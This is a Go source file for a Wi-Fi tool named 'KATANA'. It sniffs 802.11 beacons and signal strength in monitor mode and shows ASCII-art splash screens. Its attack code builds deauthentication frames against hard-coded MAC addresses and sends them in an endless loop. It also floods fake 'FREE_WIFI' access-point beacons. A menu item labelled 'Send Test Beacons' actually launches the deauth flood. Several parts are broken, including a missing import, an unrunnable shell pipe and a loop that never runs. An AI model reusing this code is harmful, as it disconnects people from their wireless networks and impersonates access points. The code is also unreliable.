package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
	//"io/ioutil"

	"github.com/fatih/color"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/guptarohit/asciigraph"
	"github.com/schollz/progressbar"
	"gopkg.in/AlecAivazis/survey.v1"
	ui "github.com/gizak/termui/v3"
	"github.com/gizak/termui/v3/widgets"
)

var (
	device       string = "wlx00c0caa8a5a3"
	snapshot_len int32  = 1024
	promiscuous  bool   = true
	err          error
	timeout      time.Duration = 1 * time.Second
	handle       *pcap.Handle
	counter      int32 = 0
	buffer       gopacket.SerializeBuffer
	options      gopacket.SerializeOptions
	chartslice   []float64
	openFlags         = 1057
	fakeApRates       = []byte{0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01}
	signal_power      = []int8{}
	length       int8 = 0
	total        int8 = 0
	count        int8 = 0
)

// DEAUTH ---------------------------------------------------------------------------------------------
var SerializationOptions = gopacket.SerializeOptions{
	FixLengths:       true,
	ComputeChecksums: true,
}

type Dot11ApConfig struct {
	SSID       string
	BSSID      net.HardwareAddr
	Channel    int
	Encryption bool
}

func Serialize(layers ...gopacket.SerializableLayer) (error, []byte) {
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, SerializationOptions, layers...); err != nil {
		return err, nil
	}
	return nil, buf.Bytes()
}

func NewDot11Deauth() (error, []byte) {

	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	radio_layer := &layers.RadioTap{
		Length:           18,
		DBMAntennaSignal: int8(-10),
		ChannelFrequency: layers.RadioTapChannelFrequency(2412),
	}
	dot11_layer := &layers.Dot11{
		Address1: net.HardwareAddr{0x60, 0xD0, 0x2C, 0x3C, 0x10, 0xC8},
		Address2: net.HardwareAddr{0x48, 0xd2, 0x24, 0x1a, 0xcb, 0xe8},
		Address3: net.HardwareAddr{0x48, 0xd2, 0x24, 0x1a, 0xcb, 0xe8},
		Type:     layers.Dot11TypeMgmtDeauthentication,
	}
	auth_layer := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11ReasonClass2FromNonAuth,
	}

	buffer = gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(
		buffer,
		options,
		radio_layer,
		dot11_layer,
		auth_layer,
	)

	outgoingPacket := buffer.Bytes()

	for {
		err = handle.WritePacketData(outgoingPacket)
		fmt.Print(".")
		if err != nil {
			log.Fatal(err)
		}
	}
}

// DEAUTH --------------------------------------------------------------------------------------------

func send_beacons() {
	flags := openFlags

	//Need high TX card with Atheros chip such as TP-Link
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	radioLayer := &layers.RadioTap{
		DBMAntennaSignal: int8(-10),
		ChannelFrequency: layers.RadioTapChannelFrequency(2412),
	}

	dot11CoreLayer := &layers.Dot11{
		Address1: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
		Address2: net.HardwareAddr{0x60, 0xde, 0xCA, 0xAB, 0xFC, 0xda},
		Address3: net.HardwareAddr{0x60, 0xde, 0xCA, 0xAB, 0xFC, 0xda},
		Type:     0x08,
	}

	dot11BeaconLayer := &layers.Dot11MgmtBeacon{
		Flags:    uint16(flags),
		Interval: 1000,
	}

	buffer = gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(
		buffer,
		options,
		radioLayer,
		dot11CoreLayer,
		dot11BeaconLayer,
		Dot11Info(layers.Dot11InformationElementIDSSID, []byte("FREE_WIFI")),
		Dot11Info(layers.Dot11InformationElementIDRates, fakeApRates),
	)
	outgoingPacket := buffer.Bytes()

	for {
		err = handle.WritePacketData(outgoingPacket)
		fmt.Print(".")
		if err != nil {
			log.Fatal(err)
		}
	}
}

func Dot11Info(id layers.Dot11InformationElementID, info []byte) *layers.Dot11InformationElement {
	return &layers.Dot11InformationElement{
		ID:     id,
		Length: uint8(len(info) & 0xff),
		Info:   info,
	}
}

//parses Dot11 and Radiotap 
func display_beacons(packet gopacket.Packet) {

	f, err := os.OpenFile("katana.txt", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("failed: %s", err)
	}
	defer f.Close()

	dot11Information := packet.Layer(layers.LayerTypeDot11)
	//dot11elementInformation := packet.Layer(layers.LayerTypeDot11InformationElement)
	radioInformation := packet.Layer(layers.LayerTypeRadioTap)

	//DOT11 ADDR INFORMATION
	if dot11Information != nil || radioInformation != nil {

		dot11Information, _ := dot11Information.(*layers.Dot11)
		//dot11elementInformation, _ := dot11elementInformation.(*layers.Dot11InformationElement)
		radioInformation, _ := radioInformation.(*layers.RadioTap)

		counter += 1

		fmt.Print("\u001b[37mStation: \u001b[32m", dot11Information.Address3,
			" \u001b[37mDestination: \u001b[32m", dot11Information.Address1,
			" \u001b[37mData: \u001b[33m", dot11Information.Type,
			" \u001b[37mSequenceNumber: \u001b[33m", dot11Information.SequenceNumber,
			" \u001b[37mFrequency: \u001b[34m", radioInformation.ChannelFrequency,
			" \u001b[37mDBM Antenna Signal: \u001b[34m", radioInformation.DBMAntennaSignal,
			" \u001b[37mRate: \u001b[33m", radioInformation.Rate,
			" \u001b[37mTX Attenuation: \u001b[35m", radioInformation.TxAttenuation,
			" \u001b[37mDBTx Attenuation: \u001b[35m", radioInformation.DBTxAttenuation,
			" \u001b[37mDBMTxPower: \u001b[35m", radioInformation.DBMTxPower,
			" \u001b[37mAntenna: \u001b[35m", radioInformation.Antenna, " \u001b[31m Beacons Captured: ", counter,
			" \u001b[37mRF Antenna Power: \u001b[35m", radioInformation.DBAntennaSignal)
			//"ESSID: ", dot11elementInformation.Info)

		if dot11Information.Address3 != nil {
			fmt.Fprintln(f, dot11Information.Address3)
		}

		fmt.Println("")
	}

}

//Visualize dBm rates 
func display_average_power(packet gopacket.Packet) {
	radioInformation := packet.Layer(layers.LayerTypeRadioTap)
	if radioInformation != nil {
		radioInformation, _ := radioInformation.(*layers.RadioTap)
		fmt.Print("\u001b[37mAntenna Signal: \u001b[34m", radioInformation.DBMAntennaSignal, "")
	}

}

//Pass into calculate_dbm_power
func average_power(total int8, x int8) {
	fmt.Println("Average AP dBm:", total/x)
}


//Takes dBm reading from 2000 beacons and and calls average_power to calculate mean dBm rate
func calculate_dbm_power(packet gopacket.Packet) {
	dot11Information := packet.Layer(layers.LayerTypeDot11)
	radioInformation := packet.Layer(layers.LayerTypeRadioTap)

	if radioInformation != nil || dot11Information != nil {
		radioInformation, _ := radioInformation.(*layers.RadioTap)
		for count := 0; count > 2000; count++ {
			signal_power = append(signal_power, radioInformation.DBMAntennaSignal)
			fmt.Print(".")
			count += 1
		}
		for _, value := range signal_power {
			total += value
			length++
		}
		average_power(total, length)
	}
}

func chart_dBm(){
	
		if err := ui.Init(); err != nil {
		log.Fatalf("FAILURE: %v", err)
	}
	defer ui.Close()

	sinData := (func() []float64 {
		n := 220
		ps := make([]float64, n)
		for i := range ps {
			ps[i] = 1 + math.Sin(float64(i)/5)
		}
		return ps
	})()
	//dBm
	lc := widgets.NewPlot()
	lc.Title = "dBm readings:"
	lc.Data = make([][]float64, 1)
	lc.Data[0] = sinData
	lc.SetRect(0, 15, 50, 25)
	lc.AxesColor = ui.ColorWhite
	lc.LineColors[0] = ui.ColorRed
	lc.Marker = widgets.MarkerDot
	//dBi
	lc2 := widgets.NewPlot()
	lc2.Title = "dBi readings:"
	lc2.Data = make([][]float64, 1)
	lc2.Data[0] = sinData
	lc2.SetRect(50, 15, 100, 25)
	lc2.AxesColor = ui.ColorWhite
	lc2.LineColors[0] = ui.ColorYellow

	draw := func(count int) {
		lc.Data[0] = sinData[count/2%220:]
		lc2.Data[0] = sinData[2*count%220:]
		ui.Render(lc, lc2)
	}

	tickerCount := 1
	draw(tickerCount)
	tickerCount++
	uiEvents := ui.PollEvents()
	ticker := time.NewTicker(time.Second).C
	
	for {
		select {
			
		case e := <-uiEvents:
			switch e.ID {
			case "q", "<C-c>":
			return}
			
		case <-ticker:
			draw(tickerCount)
			tickerCount++
			}
	    }
}

func main() {

	rotate()

	addrs, err := net.InterfaceAddrs()

	if err != nil {
		os.Stderr.WriteString("There was an error: " + err.Error() + "\n")
		os.Exit(1)
	}

	print_interfaces := exec.Command("iwconfig | grep -w Monitor")
	print_interfaces.Stdout = os.Stdout
	print_interfaces.Run()

	fmt.Println("__________________________________________________________________________")
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To16() != nil {

				os.Stdout.WriteString("\nAddress assigned to network interface: " + ipnet.IP.String() + "\n")
			}
		}
	}

	fmt.Println("__________________________________________________________________________")

	option_select := ""
	prompt := &survey.Select{
		Message: "\n",
		Options: []string{"Start Monitor", "Show beacon statistics", "Send Test Beacons", "Print RTap-Power Chart",
				  "Observe dBm Rates", "Calculate Average dBm", "Live dBm"},
	}

	fmt.Print("\n")
	survey.AskOne(prompt, &option_select, nil)

	if option_select == "Start Monitor" {
		fmt.Println("Press key to begin...")
		handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)

		if err != nil {
			log.Fatal(err)
		}

		defer handle.Close()
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			display_beacons(packet)
		}

	}

	if option_select == "Show beacon statistics" {
		fmt.Println("Here are the statistics:")
		os.Exit(3)
	}

	if option_select == "Send Test Beacons" {
		fmt.Println("Starting...")
		NewDot11Deauth()
	}

	if option_select == "Print RTap-Power Chart" {
		printAChart()
	}

	if option_select == "Observe dBm Rates" {
		handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
		if err != nil {
			log.Fatal(err)
		}
		defer handle.Close()
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			display_average_power(packet)
		}
	}

	if option_select == "Calculate Average dBm" {
		handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
		if err != nil {
			log.Fatal(err)
		}
		defer handle.Close()
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			calculate_dbm_power(packet)
		}
	}
	
	if option_select == "Live dBm" {
		chart_dBm()	
	}
}

func printAChart() {

	//Develop
	graph := asciigraph.Plot(chartslice)
	fmt.Println(graph)
}

func printA() {

	clearscreen := exec.Command("clear")
	clearscreen.Stdout = os.Stdout
	clearscreen.Run()
	print_artwork()
}

func printB() {
	clearscreen := exec.Command("clear")
	clearscreen.Stdout = os.Stdout
	clearscreen.Run()
	print_artwork2()
}

func printC() {
	clearscreen := exec.Command("clear")
	clearscreen.Stdout = os.Stdout
	clearscreen.Run()
	print_artwork3()

}

//Animation handling
func rotate() {
	for {
		printA()
		time.Sleep(50 * time.Millisecond)
		printB()
		time.Sleep(50 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(50 * time.Millisecond)
		printB()
		time.Sleep(50 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(100 * time.Millisecond)
		printB()
		time.Sleep(100 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printB()
		time.Sleep(50 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(50 * time.Millisecond)
		printB()
		time.Sleep(50 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(100 * time.Millisecond)
		printB()
		time.Sleep(100 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(100 * time.Millisecond)
		printB()
		time.Sleep(100 * time.Millisecond)
		printC()
		time.Sleep(100 * time.Millisecond)
		fmt.Println("\n")
		clearscreen2 := exec.Command("clear")
		clearscreen2.Stdout = os.Stdout
		clearscreen2.Run()
		color.Red("\nKATANA LOADING...\n")
		fmt.Println("\n")
		bar := progressbar.New(100)
		for i := 0; i < 100; i++ {
			bar.Add(1)
			time.Sleep(2 * time.Millisecond)
		}
		clearscreen := exec.Command("clear")
		clearscreen.Stdout = os.Stdout
		clearscreen.Run()
		break
	}
}

func print_artwork() {
	color.Blue(`


                                          KATANA

                                      ://oyydmmho++/--.
                                     soyNNNMMNNNho++--
                                     sNNhyyNNMMMNm+.-./.
                                    sNMNys:+NMMNdoo+-/oys+-
                                  :shMMMMs-hdNmo/+/+yhmds-
                                   .NMMMMNdMssos-shhmNNMNm+.
                                  -ydMMMMNohs--: /yoNNMs+oo--
                                  --shMMMN:-d--..---oMMh--
                                ----..mNMMNdNyoo/- -+Msys:- ----
                             -.-   --.shdMMMMMdmms.:mMd:-++/-   --
                             -.    -.-/hdhhhddddmNh+/ymh. -:+--   --
                              -.-     -sdyo+::.:-:/s/--:/-  -.    ---
                                ----  :ohddhhh/-...-+/
                                   ---./dmdhyso+/:--.---
                                      -:yhhdmmdo:.--   -.-
                                       -sNNmdmmm/ -     ---
                                         /dMMMMM: -.   -. .     :/-
                                          -+mMMMy/:.   .-::    :dy/.---
                                            -sNMMNN-   -.:-     :o: .o/:
                                              -dNMM-    : -   --s-  -:dm.
                                               -yNMs    h---.:::-.ossdNh-
                                               -+MMN-   :--    .soo/.mm-
                                               sdMMM/       --.:-   .o.
                                              .MMMMNd++o+-.- :-
                                              :MMMNMNmmds/o-.---
                                              +MMmsMNmNd:-    -:-
                                              oMMNmMMs...---:+/so.
                                              +MMMMMMm:     -//+Nmo.
                                              :dMMMMMd/:-    ::+mMMm+-
                                             --/mMMMMhy/     --+dMMMMd-
                                            -:.-+MMMMN-./-    -.hMMMMMN+
                                            :.--:dMMMMd  .--   -:mMMMMMMs
                                           .--...oMMMMM+   -    -:mMMMMMMs
                                           /--:..:dMMMMm          -dMMMMMMs
                                          --  -.-:/NMMMMo          .hMMMMMN/
                                         -.      -:yMMMMN.     :    -+hmMMMN:
                                         -      -. /NMMMMs     -:.    ...:+yd-
                                        -      ..  .oMMMMN-     ./y.   .-   ./
                                      ..      ..    -mMMMM+      -NNo-  -.    -
                                    -.       --     -oMMMMd       sMMm+-.:--
                                   .-      ---       -hMMMM-      .NMMNy:.--
                                 .:--     -.         -+MMMM+ -     dMNy-
                                .mNmdyo.- .           -mMMNo:.--..-yo:-
                                hMMMMMo---            -sMN+. --   --
                               .dMMMMN:  .            -/Ns-   -
                              :oyMMMdo+o-            -//s/--- -
                             :NhNMMMdy-:-            +NNoNN/---
                             hNmMMMMNho.             sMMNMM:  -
                             yNMMMMMm.--             /mMMMm+/--
                             +MMNNhho-.             -yhMMM+-.-
                            .mMMh:-+o.              yMmMMNhN-.-
                            yMMh- -                 hNNMMMNd/:-
                           /NNd+ -                  +dNMMNyh..
                         .+mNN:.:-                   sMMNh/y+-
                        .mMN++. -                    yMMh/-.
                       :hmdm+---.                   -NMM+ .
                       yNMs:..----                  +MMN+ -
                       -smNMN:.-:-.                 NMMN:-:..
                          sMMm/-h..                -dNNh.   --.
                          -odNms:..                :hyy... .-y:
                             -:+o+-                sMMM+:.--+o:
                                                   mMNms/.:--.
                                                   /osy-.--
`)
}

func print_artwork2() {
	color.Green(`


                                          KATANA

                                      ://oyydmmho++/--.
                                     soyNNNMMNNNho++--
                                     sNNhyyNNMMMNm+.-./.
                                    sNMNys:+NMMNdoo+-/oys+-
                                  :shMMMMs-hdNmo/+/+yhmds-
                                   .NMMMMNdMssos-shhmNNMNm+.
                                  -ydMMMMNohs--: /yoNNMs+oo--
                                  --shMMMN:-d--..---oMMh--
                                ----..mNMMNdNyoo/- -+Msys:- ----
                             -.-   --.shdMMMMMdmms.:mMd:-++/-   --
                             -.    -.-/hdhhhddddmNh+/ymh. -:+--   --
                              -.-     -sdyo+::.:-:/s/--:/-  -.    ---
                                ----  :ohddhhh/-...-+/
                                   ---./dmdhyso+/:--.---
                                      -:yhhdmmdo:.--   -.-
                                       -sNNmdmmm/ -     ---
                                         /dMMMMM: -.   -. .     :/-
                                          -+mMMMy/:.   .-::    :dy/.---
                                            -sNMMNN-   -.:-     :o: .o/:
                                              -dNMM-    : -   --s-  -:dm.
                                               -yNMs    h---.:::-.ossdNh-
                                               -+MMN-   :--    .soo/.mm-
                                               sdMMM/       --.:-   .o.
                                              .MMMMNd++o+-.- :-
                                              :MMMNMNmmds/o-.---
                                              +MMmsMNmNd:-    -:-
                                              oMMNmMMs...---:+/so.
                                              +MMMMMMm:     -//+Nmo.
                                              :dMMMMMd/:-    ::+mMMm+-
                                             --/mMMMMhy/     --+dMMMMd-
                                            -:.-+MMMMN-./-    -.hMMMMMN+
                                            :.--:dMMMMd  .--   -:mMMMMMMs
                                           .--...oMMMMM+   -    -:mMMMMMMs
                                           /--:..:dMMMMm          -dMMMMMMs
                                          --  -.-:/NMMMMo          .hMMMMMN/
                                         -.      -:yMMMMN.     :    -+hmMMMN:
                                         -      -. /NMMMMs     -:.    ...:+yd-
                                        -      ..  .oMMMMN-     ./y.   .-   ./
                                      ..      ..    -mMMMM+      -NNo-  -.    -
                                    -.       --     -oMMMMd       sMMm+-.:--
                                   .-      ---       -hMMMM-      .NMMNy:.--
                                 .:--     -.         -+MMMM+ -     dMNy-
                                .mNmdyo.- .           -mMMNo:.--..-yo:-
                                hMMMMMo---            -sMN+. --   --
                               .dMMMMN:  .            -/Ns-   -
                              :oyMMMdo+o-            -//s/--- -
                             :NhNMMMdy-:-            +NNoNN/---
                             hNmMMMMNho.             sMMNMM:  -
                             yNMMMMMm.--             /mMMMm+/--
                             +MMNNhho-.             -yhMMM+-.-
                            .mMMh:-+o.              yMmMMNhN-.-
                            yMMh- -                 hNNMMMNd/:-
                           /NNd+ -                  +dNMMNyh..
                         .+mNN:.:-                   sMMNh/y+-
                        .mMN++. -                    yMMh/-.
                       :hmdm+---.                   -NMM+ .
                       yNMs:..----                  +MMN+ -
                       -smNMN:.-:-.                 NMMN:-:..
                          sMMm/-h..                -dNNh.   --.
                          -odNms:..                :hyy... .-y:
                             -:+o+-                sMMM+:.--+o:
                                                   mMNms/.:--.
                                                   /osy-.--
`)
}

func print_artwork3() {
	color.Red(`
                              /
                               /
                                /
                                 /        KATANA
                                  /
                                   /  ://oyydmmho++/--.
                                    /soyNNNMMNNNho++--
                                     sNNhyyNNMMMNm+.-./.
                                    sNMNys:+NMMNdoo+-/oys+-
                                  :shMMMMs-hdNmo/+/+yhmds-
                                   .NMMMMNdMssos-shhmNNMNm+.
                                  -ydMMMMNohs--: /yoNNMs+oo--
                                  --shMMMN:-d--..---oMMh--
                                ----..mNMMNdNyoo/- -+Msys:- ----
                             -.-   --.shdMMMMMdmms.:mMd:-++/-   --
                             -.    -.-/hdhhhddddmNh+/ymh. -:+--   --
                              -.-     -sdyo+::.:-:/s/--:/-  -.    ---
                                ----  :ohddhhh/-...-+  /
                                   ---./dmdhyso+/:--.--- /
                                      -:yhhdmmdo:.--   -.- /
                                       -sNNmdmmm/ -     --- /
                                         /dMMMMM: -.   -. .   /   :/-
                                          -+mMMMy/:.   .-::    :dy/.---
                                            -sNMMNN-   -.:-     :o: .o/:
                                              -dNMM-    : -   --s-  -:dm.
                                               -yNMs    h---.:::-.ossdNh-
                                               -+MMN-   :--    .soo/.mm-
                                               sdMMM/       --.:-   .o.
                                              .MMMMNd++o+-.- :-
                                              :MMMNMNmmds/o-.---
                                              +MMmsMNmNd:-    -:-
                                              oMMNmMMs...---:+/so.
                                              +MMMMMMm:     -//+Nmo.
                                              :dMMMMMd/:-    ::+mMMm+-
                                             --/mMMMMhy/     --+dMMMMd-
                                            -:.-+MMMMN-./-    -.hMMMMMN+
                                            :.--:dMMMMd  .--   -:mMMMMMMs
                                           .--...oMMMMM+   -    -:mMMMMMMs
                                           /--:..:dMMMMm          -dMMMMMMs
                                          --  -.-:/NMMMMo          .hMMMMMN/
                                         -.      -:yMMMMN.     :    -+hmMMMN:
                                         -      -. /NMMMMs     -:.    ...:+yd-
                                        -      ..  .oMMMMN-     ./y.   .-   ./
                                      ..      ..    -mMMMM+      -NNo-  -.    -
                                    -.       --     -oMMMMd       sMMm+-.:--
                                   .-      ---       -hMMMM-      .NMMNy:.--
                                 .:--     -.         -+MMMM+ -     dMNy-
                                .mNmdyo.- .           -mMMNo:.--..-yo:-
                                hMMMMMo---            -sMN+. --   --
                               .dMMMMN:  .            -/Ns-   -
                              :oyMMMdo+o-            -//s/--- -
                             :NhNMMMdy-:-            +NNoNN/---
                             hNmMMMMNho.             sMMNMM:  -
                             yNMMMMMm.--             /mMMMm+/--
                             +MMNNhho-.             -yhMMM+-.-
                            .mMMh:-+o.              yMmMMNhN-.-
                            yMMh- -                 hNNMMMNd/:-
                           /NNd+ -                  +dNMMNyh..
                         .+mNN:.:-                   sMMNh/y+-
                        .mMN++. -                    yMMh/-.
                       :hmdm+---.                   -NMM+ .
                       yNMs:..----                  +MMN+ -
                       -smNMN:.-:-.                 NMMN:-:..
                          sMMm/-h..                -dNNh.   --.
                          -odNms:..                :hyy... .-y:
                             -:+o+-                sMMM+:.--+o:
                                                   mMNms/.:--.
                                                   /osy-.--
`)
}
